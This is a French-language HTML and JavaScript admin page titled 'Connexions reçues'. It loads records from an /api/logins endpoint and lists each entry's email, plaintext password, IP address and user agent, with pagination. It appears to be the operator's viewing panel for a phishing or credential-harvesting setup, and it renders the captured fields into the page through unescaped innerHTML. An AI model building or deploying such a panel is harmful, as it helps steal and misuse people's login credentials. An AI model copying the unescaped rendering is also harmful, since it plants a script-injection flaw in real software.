<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin - Connexions reçues</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="apple-touch-icon" sizes="180x180" href="assets/favicon/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="assets/favicon/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="assets/favicon/favicon-16x16.png">
  <link rel="manifest" href="assets/favicon/site.webmanifest">
  <style>
    body { background: #f7f9fc; }
    .page { max-width: 1100px; }
    .token-input { font-family: monospace; }
    .small-col { white-space: nowrap; }
    .truncate { max-width: 320px; overflow: hidden; text-overflow: ellipsis; }
    .table thead th { position: sticky; top: 0; background: #fff; z-index: 1; }
    .copy-btn { border: none; background: transparent; color: #0d6efd; }
  </style>
</head>
<body>
  <div class="container page py-4">
    <h1 class="h3 mb-4">Connexions reçues</h1>

    <div class="card mb-4">
      <div class="card-body">
        <div class="row g-3 align-items-end">
          <div class="col-md-4">
            <label class="form-label">Token admin (si défini)</label>
            <input type="password" id="adminToken" class="form-control token-input" placeholder="X-Admin-Token">
          </div>
          <div class="col-md-3">
            <label class="form-label">Limite</label>
            <input type="number" id="limit" class="form-control" value="20" min="1" max="100">
          </div>
          <div class="col-md-5 d-flex gap-2">
            <button id="loadBtn" class="btn btn-primary">Charger la liste</button>
            <button id="resetBtn" class="btn btn-outline-secondary">Réinitialiser</button>
          </div>
        </div>
        <div id="alert" class="mt-3"></div>
      </div>
    </div>

    <div class="card">
      <div class="card-body">
        <div class="d-flex justify-content-between align-items-center mb-3">
          <h2 class="h5 mb-0">Résultats</h2>
          <div>
            <button id="prevBtn" class="btn btn-sm btn-outline-secondary" disabled>Précédent</button>
            <button id="nextBtn" class="btn btn-sm btn-outline-secondary" disabled>Suivant</button>
          </div>
        </div>
        <div class="table-responsive" style="max-height: 60vh;">
          <table class="table table-sm align-middle">
            <thead>
              <tr>
                <th class="small-col">#</th>
                <th>ID</th>
                <th>Email</th>
                <th>Mot de passe</th>
                <th>Date</th>
                <th>IP</th>
                <th>Agent</th>
                <th class="small-col">Actions</th>
              </tr>
            </thead>
            <tbody id="tbody"></tbody>
          </table>
        </div>
      </div>
    </div>
  </div>

  <script>
    const tbody = document.getElementById('tbody');
    const alertBox = document.getElementById('alert');
    const loadBtn = document.getElementById('loadBtn');
    const resetBtn = document.getElementById('resetBtn');
    const nextBtn = document.getElementById('nextBtn');
    const prevBtn = document.getElementById('prevBtn');

    let cursorStack = []; // pour navigation arrière
    let currentCursor = undefined;

    function showAlert(type, msg) {
      alertBox.innerHTML = `<div class="alert alert-${type} mb-0">${msg}</div>`;
    }

    function clearAlert() { alertBox.innerHTML = ''; }

    function copy(text) {
      navigator.clipboard.writeText(text).then(() => {
        showAlert('success', 'Copié dans le presse-papiers');
        setTimeout(clearAlert, 1200);
      }).catch(() => showAlert('danger', 'Échec de la copie'));
    }

    function renderRows(items) {
      tbody.innerHTML = '';
      if (!items || items.length === 0) {
        const tr = document.createElement('tr');
        const td = document.createElement('td');
        td.colSpan = 8;
        td.className = 'text-center text-muted';
        td.textContent = 'Aucun résultat';
        tr.appendChild(td);
        tbody.appendChild(tr);
        return;
      }
      items.forEach((it, i) => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td class="small-col">${i + 1}</td>
          <td class="truncate" title="${it.id}">${it.id}</td>
          <td class="truncate" title="${it.email || ''}">${it.email || ''}</td>
          <td class="truncate" title="${it.password || ''}">${it.password || ''}</td>
          <td class="small-col">${it.receivedAt ? new Date(it.receivedAt).toLocaleString() : ''}</td>
          <td class="small-col" title="${it.ip || ''}">${it.ip || ''}</td>
          <td class="truncate" title="${it.userAgent || ''}">${it.userAgent || ''}</td>
          <td class="small-col">
            <button class="copy-btn" title="Copier l'ID" onclick="(${copy.toString()})('${it.id}')"><i class="fa-regular fa-copy"></i></button>
          </td>
        `;
        tbody.appendChild(tr);
      });
    }

    async function fetchList(nextCursor) {
      try {
        showAlert('info', 'Chargement...');
        const limit = Math.min(100, Math.max(1, parseInt(document.getElementById('limit').value || '20', 10)));
        const token = document.getElementById('adminToken').value.trim();
        const u = new URL('/api/logins', window.location.origin);
        u.searchParams.set('limit', String(limit));
        if (nextCursor) u.searchParams.set('cursor', nextCursor);
        
        const headers = { };
        if (token) headers['X-Admin-Token'] = token;

        const res = await fetch(u.toString(), { headers });
        const data = await res.json().catch(() => ({}));
        if (!res.ok) throw new Error(data?.message || 'Erreur serveur');
        
        renderRows(data.items || []);

        // Gestion des boutons de pagination
        nextBtn.disabled = !data.cursor;
        prevBtn.disabled = cursorStack.length === 0;

        currentCursor = data.cursor || undefined;
        clearAlert();
      } catch (e) {
        showAlert('danger', e.message);
      }
    }

    loadBtn.addEventListener('click', () => {
      cursorStack = []; // reset navigation
      currentCursor = undefined;
      fetchList(undefined);
    });

    resetBtn.addEventListener('click', () => {
      document.getElementById('adminToken').value = '';
      document.getElementById('limit').value = '20';
      tbody.innerHTML = '';
      cursorStack = [];
      currentCursor = undefined;
      clearAlert();
    });

    nextBtn.addEventListener('click', () => {
      if (currentCursor) {
        cursorStack.push(currentCursor);
        fetchList(currentCursor);
      }
    });

    prevBtn.addEventListener('click', () => {
      if (cursorStack.length > 0) {
        const prev = cursorStack.length > 1 ? cursorStack[cursorStack.length - 2] : undefined;
        cursorStack.pop();
        fetchList(prev);
      }
    });
  </script>
</body>
</html>
